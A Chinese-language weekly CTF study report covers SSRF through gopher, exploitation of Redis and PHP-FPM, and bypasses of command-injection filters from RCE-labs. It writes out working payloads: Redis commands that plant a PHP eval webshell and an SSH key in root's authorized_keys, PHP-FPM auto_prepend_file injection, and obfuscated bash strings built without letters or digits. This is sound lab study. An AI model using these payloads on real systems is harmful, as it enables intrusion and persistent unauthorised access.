# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. ctfhub web基础通关
>包括ssrf
2. rce-labs 0-13关
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
1. rce-labs通关
2. 反序列化靶场学习
3. docker
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
#### 一.SSRF服务器端请求伪造
>攻击者利用服务器端发送请求，执行恶意操作，攻击的目标是从外网无法访问的内部系统。

常用的伪协议:
1. file://绝对路径 读取文件(靶机常用位置:var/www/html)
2. dict://ip:port/命令 常用于扫描开放端口
3. gopher://ip:port/gopher-path(_)TCP数据流 利用服务器传输数据包
>+ gopher-path指返回的资源类型，而在ssrf中可以用一个"_"来代替
>+ 数据流必须以\r\n结尾，转url码为%0D%0A，这样服务器才能判断执行情况

典型题型:
1. POST传参
>ssrf主要是利用服务器发送请求，所以需要利用服务器的回环ip(127.0.0.1)对内网进行post传参，这就需要我们利用gopher伪协议构造post请求数据流

一个基本的post请求(表单请求)一定要包含以下要素

###### POST /[请求路径] HTTP/[版本]
>POST /flag.php HTTP/1.1
###### 访问的服务器域名
>Host: 127.0.0.1:80
###### 媒体类型，application/x-www-form-urlencoded为默认的表单格式
>Content-Type: application/x-www-form-urlencoded
###### body的字节大小，必须相等
>Content-Length: 36 

>body

还有一种常用的multipart/form-data媒体类型，用于文件上传。它的每一个部分都用 --boundary (WebKitFormBoundary)进行分界，在部分体中还需要再用Content-Type明确文件MIME类型
每部分都是以 --boundary 开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容
>POST http://www.example.com HTTP/1.1
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA
(定义boundary)
>------WebKitFormBoundaryrGKCBY7qhFd3TrwA
Content-Disposition: form-data; name="ahweg"

>title(描述字段)
------WebKitFormBoundaryrGKCBY7qhFd3TrwA
Content-Disposition: form-data; name="file"; filename="ahweg.png"
Content-Type: image/png(文件字段)

>PNG ... content of ahweg.png ...(二进制数据)
------WebKitFormBoundaryrGKCBY7qhFd3TrwA--

如果有条件，可以选择抓包构造post

最后将请求进行url编码，再放进gopher数据流中就可以发送请求了

**注意:根据HTTP协议的标准要求，HTTP消息中的每一行必须以CRLF(回车+换行)序列结束。并且在传输数据流时需要进行两次url编码(url栏自解析一次，gopher解析一次)**

2. Redis
>Redis是一种键值数据库，与mysql不同在于它的数据保存在内存中，读写速度特别快，所以多用于数据缓存。我们可以通过Redis服务器与主机进行数据交互，储存恶意文件给服务器主机。默认端口为6379

Redis数据交互严格遵循RESP协议，Redis只能识别RESP格式的数据内容，这种协议要求:
>1. 一行命令为一组，一行内每块字符串为一个Bulk Strings
>2. 要先计数，再在下一行表达内容
>3. 计数时第一个字符为类型标记，数组为*，数字为:，Bulk Strings(批量字符串)为$
>4. 同样每条执行后都要有\r\n

比如指令 SET name "uky"(SET:更改/建立键值)
>*3\\r\\n
>\$3\\r\\n
SET\\r\\n
>\$4\\r\\n
name\\r\\n
>\$3\\r\\n
uky\\r\\n

对于ssrf，我们可以通过Redis向服务器创建一个一句话木马文件
```Redis
    flushall #清除缓存
    set 1 '<?php eval($_POST[\"cmd\"]);?>' 
    # 1是键名，所以应保存为字符串
    config set dir /var/www/html
    config set dbfilename shell.php
    save
```
再用脚本将其转化为RESP格式，同样进行两次url编码，再用gopher传包

如果权限允许，还可以写入SSH公钥
```Redis
    flushall
    set 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali'
    config set dir /root/.ssh/
    config set dbfilename authorized_keys
    save
```
传包后用kali连接就行了

3. PHP-FPM攻击
>fastcgi是web中间件与后端编程语言之间的通信协议，与http协议类似，拥有header和body。FPM负责解析fastcgi协议，它将请求解析为键值对再发送给后端。和上述攻击一样，我们可以自己伪造fastcgi请求。默认端口为9000

一个FPM解析按照SCRIPT_FILENAME的值执行php文件，但文件必须存在于服务器内部才能执行。
但FPM又有两个环境变量PHP_VALUE和PHP_ADMIN_VALUE可以设置php配置
>'PHP_VALUE': 'auto_prepend_file = php://input',
  //auto_prepend_file指在执行php文件之前执行的操作，可以用php://input让FPM执行body的I流，达到任意命令执行的目的
  'PHP_ADMIN_VALUE': 'allow_url_include = On'
  //allow_url_include负责远程文件包含，启用了input伪协议

这样即使执行的是内部php文件，都会先执行body里的payload。
一般SCRIPT_FILENAME可选择已有文件:
>/var/www/html/index.php
 /usr/local/lib/php/PEAR.php

写好FPM解析后就可以用fastcgi协议编译后传包了(gopher+两次urlencode)

这部分可以直接用脚本Gopherus构造payload
```python
python gopherus.py --exploit fastcgi
```

###### 一些绕过方法
+ ban了域名:可使用其他域名@127.0.0.1 最终解析的仍是回环地址http://127.0.0.1
+ ban了ip:用127.0.0.x，0.0.0.0，localhost:，十六进制，十进制，八进制格式代替
+ DNS重绑定:如果上面方法绕过不了ip验证可以使用
  原理很简单，就是将127.0.0.1绑定到一个公网域名上，再让服务器访问此域名，最后会被DNS解析为127.0.0.1

#### 二.RCE-labs通关知识汇总
##### I. 不完全过滤
1. 不完全

读取bin文件:由于shell的命令储存在/bin中，可以读取其中的命令文件达到命令执行效果。
>/bin/cat /flag

由于是无字母rce，可以使用通配符
###### /???/?a??64 /??a?
>/bin/base64 /flag

2. 无字母
+ 八进制
>八进制解析只有bash支持，可通过ls -l /bin/sh或echo $0查看当前终端的类型
>一般情况下在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash

用法：
>$'\154\163'
>空格不能解析，所以要分开写多个语句

如果数字也进行了不完全过滤(只剩0和1)，可以考虑用二进制构造八进制的每一组数

基本格式
> $((2#binary)) //binary:二进制
2可以用(1<<1)替换

>$(())是算术扩展，让其在括号中执行运算再替换到当前位置

但由于bash运行逻辑顺序，导致$'\\'八进制最后不会被解析,这就需要用到here strings
###### 将字符串直接作为命令的输入
>command <<< string
###### 特殊用法:将字符串传递给当前shell并执行
>$0 <<< string

如果命令带有参数，则要连用两次。先将string整体作为字符串传给shell解码，再传给shell执行，由于解码可以解析\40，在第二次传给shell时shell就可以识别命令与参数是分开的，所以此时可以使用\40作为空格

所以payload可以这么写:
```python
$0<<<$0\<\<\<\$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
```
注意作为字符串应先将特殊符号转义，避免当作命令执行

如果连0和1都禁了，成为无字母+无数字
>\${\#}变量代表传递给当前脚本的参数个数，但bash直接运行时是没有参数的，返回为0
>\${\#xxx}，它用于表示变量存储的字符串长度，"0"长度为1
>\${!xxx}，它表示用一个变量的值作为另一个变量的名字，然后取出该变量的值

所以1可以用\${##}代替，0可以用\${!#}代替

如果连#都ban了，那么$((2#binary))也没用了
```python
\$(())        # 空算术扩展 = 0
\$((~0))      # 按位取反 0 = -1
\$((~0))$((~0)) = -1-1 = -2  (字符串连接在算术中变成数字拼接)
\$((~-2)) = 1  (按位取反 -2)
```
按照这种构造，我们可以构造出0-7
但sh符不支持识别这种特性，我们只能先设一个变量，再从变量里取出值
```python
__=$(())&&${!__}<<<${!__}
```
ls:
```python
__=$(())&&${!__}<<<${!__}\<\<\<\$\'\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\'
```
##### II. 无回显rce
1. /dev/null 2>&1绕过
> system($cmd.">/dev/null 2>&1");

shell的操作有三种描述
>标准输入(stdin)：文件描述符为0，通常关联着终端键盘输入
标准输出(stdout)：文件描述符为1，通常关联着终端屏幕输出
标准错误(stderr)：文件描述符为2，通常关联着终端屏幕输出

/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；将命令的输出重定向到它，会起到"禁止输出"的效果，并且报错

m>&n(m,n=0,1,2)指将m的操作描述重绑定为n，所以2>&1意思为将报错描述转为输出描述，这样报错都不会回显

绕过方法也很简单：在命令结尾加上%0A(tab),这样命令就不会在同一行执行

# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
学习了ssrf基础和rce绕过技巧
